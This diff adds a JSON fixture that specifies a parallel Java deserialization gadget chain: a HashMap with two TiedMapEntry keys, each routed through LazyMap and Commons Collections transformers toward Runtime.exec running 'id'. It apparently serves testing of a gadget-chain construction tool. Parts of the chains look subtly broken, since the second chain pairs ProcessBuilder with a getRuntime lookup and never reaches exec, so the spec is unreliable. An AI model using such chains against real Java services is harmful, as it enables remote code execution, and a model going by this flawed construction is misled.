@@ -1,0 +1,83 @@
+{
+    "chain_type": "JDD-style parallel: HashMap with TWO TiedMapEntry keys → separate LazyMap→InvokerTransformer chains",
+    "root_class": "java.util.HashMap",
+    "root_trigger": "readObject→putVal→hash→TiedMapEntry.hashCode→LazyMap.get (×2 parallel keys)",
+    "links": [
+        {
+            "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+            "field_overrides": {
+                "map": {"$ref": "link:2"},
+                "key": "key_alpha"
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+            "field_overrides": {
+                "map": {"$ref": "link:3"},
+                "key": "key_beta"
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.map.LazyMap",
+            "field_overrides": {
+                "map": {},
+                "factory": {"$ref": "link:4"}
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.map.LazyMap",
+            "field_overrides": {
+                "map": {},
+                "factory": {"$ref": "link:7"}
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ChainedTransformer",
+            "field_overrides": {
+                "iTransformers": [
+                    {"$ref": "link:5"},
+                    {"$ref": "link:6"}
+                ]
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ConstantTransformer",
+            "field_overrides": {
+                "iConstant": "java.lang.Runtime"
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.InvokerTransformer",
+            "field_overrides": {
+                "iMethodName": "exec",
+                "iParamTypes": ["java.lang.String"],
+                "iArgs": ["id"]
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ChainedTransformer",
+            "field_overrides": {
+                "iTransformers": [
+                    {"$ref": "link:8"},
+                    {"$ref": "link:9"}
+                ]
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.ConstantTransformer",
+            "field_overrides": {
+                "iConstant": "java.lang.ProcessBuilder"
+            }
+        },
+        {
+            "class": "org.apache.commons.collections.functors.InvokerTransformer",
+            "field_overrides": {
+                "iMethodName": "getMethod",
+                "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+                "iArgs": ["getRuntime", []]
+            }
+        }
+    ],
+    "sink_method": "Runtime.exec",
+    "notes": "Parallel object graph: two independent TiedMapEntry keys in the same HashMap, each leading to a separate transformer chain. Tests JDD-style parallel gadget construction."
+}
